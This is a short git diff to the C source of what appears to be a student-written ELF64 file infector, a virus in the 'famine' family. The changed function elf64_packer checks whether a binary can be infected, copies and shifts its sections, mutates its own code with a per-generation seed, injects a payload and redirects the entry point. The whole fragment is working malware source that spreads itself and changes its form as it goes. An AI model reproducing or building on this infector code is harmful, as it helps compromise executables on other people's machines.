@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/11 20:39:10 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/13 09:04:26 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -80,22 +80,22 @@ static bool	define_shift_amount(const struct entry *original_entry, size_t *shif
 	return true;
 }
 
-bool		elf64_packer(const struct famine food, size_t original_file_size)
+bool		elf64_packer(const struct famine food, size_t original_file_size, uint64_t seed[2])
 {
 	struct entry	original_entry;
 	struct entry	clone_entry;
 	size_t		shift_amount;
-	uint64_t	seed = 0b101010;
+	uint64_t	son_seed[2];
 
 	if (!find_entry(&original_entry, food.original_safe)
 	|| !can_infect(&original_entry, food.original_safe)
 	|| !define_shift_amount(&original_entry, &shift_amount)
-	|| !metamorph_self(seed)
+	|| !metamorph_self(seed, son_seed)
 	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
 	|| !adjust_references(food.clone_safe , shift_amount, &original_entry)
 	|| !find_entry(&clone_entry, food.clone_safe)
 	|| !adjust_sizes(shift_amount, &clone_entry)
-	|| !setup_payload(&clone_entry, food.clone_safe)
+	|| !setup_payload(&clone_entry, food.clone_safe, son_seed)
 	|| !change_entry(food.clone_safe, &original_entry))
 		return errors(ERR_THROW, 'a','4');
 
